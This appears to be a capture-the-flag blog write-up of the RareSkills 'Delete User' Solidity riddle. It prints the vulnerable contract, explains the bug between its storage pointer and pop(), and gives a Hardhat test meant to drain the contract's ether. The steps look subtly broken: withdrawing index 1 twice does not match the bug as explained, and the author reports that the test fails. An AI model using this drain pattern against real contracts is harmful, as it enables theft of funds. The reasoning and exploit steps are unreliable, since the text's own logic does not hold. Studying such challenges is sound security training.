
## Day 17 Storage pointer

### RareSkills Riddles: Delete user

This seeminly simple contract starts with 1 Ether and our goal is the steal all of that.  Here is the entirety of the contract: 

```Java
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}
```

Looking at ```deposit()``` nothing funny seems to be happening, so let's focus on ```withdraw()```.  Here you are allowed to enter any uint256 you wish and attempt to withdraw it.  The only requirement check is that the address of the structure pointed to is the same as msg.sender.  Any call to withdraw() with an index outside of users will revert.  

One other item to note is that inside ```withdraw()``` the User data is stored as: storage not memory.  This means that after the withdraw() method is done the values will persist.  

There is a bug in ```withdraw()``` because we can access any item in the array, however the elements are deleted from the array using pop(), which only deletes the last element.  So we can delete users from the array even if we are not the owner.  This also means that we can withdraw the same amount more than once as long as it is not the last item in the array ```users```.  We can then drain the contract without any code by: 

- depositing 1 ETH
- depositing 0 ETH
- calling ```withdraw(1)``` this will delete the 0 Eth deposit.  
- calling ```withdraw(1)``` again, this deletes our 1 Eth deposit.  

Code to do this is given below: 

```Javascript
    it("conduct your attack here", async function () {
      // deposit 1 ETH
      await victimContract.connect(attackerWallet).deposit({ value: ethers.utils.parseEther("1") });
      // deposit 0 ETH
      await victimContract.connect(attackerWallet).deposit({ value: 0 });
      // withdraw 1 ETH x 2 (first one deletes the 0 ETH deposit)
      await victimContract.connect(attackerWallet).withdraw(1);
      await victimContract.connect(attackerWallet).withdraw(1);
    });
```

The Hardhat test fails because it said this needed to be accomplished in one transaction, however that was not mentioned in the challenge description.  